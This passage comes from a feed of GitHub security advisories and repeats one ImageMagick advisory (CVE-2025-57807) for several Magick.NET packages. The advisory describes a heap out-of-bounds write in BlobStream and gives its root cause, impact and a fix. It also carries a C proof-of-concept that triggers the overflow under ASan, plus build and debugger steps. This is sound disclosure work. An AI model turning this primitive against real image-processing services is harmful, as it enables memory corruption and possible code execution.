<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-OpenMP-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
